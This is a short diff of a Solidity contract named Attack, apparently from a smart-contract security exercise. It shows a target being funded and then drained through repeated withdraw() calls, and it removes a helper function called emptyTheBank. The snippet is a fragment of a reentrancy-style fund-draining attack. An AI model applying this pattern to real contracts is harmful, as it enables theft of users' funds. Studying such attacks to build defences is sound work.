@@ -19,10 +19,6 @@ contract Attack {
         payable(address(target)).transfer(.0001 ether);
         target.withdraw();
     }
-
-    function emptyTheBank() public {
-        target.withdraw();
-    }
-
+    
     receive() external payable {}
 }
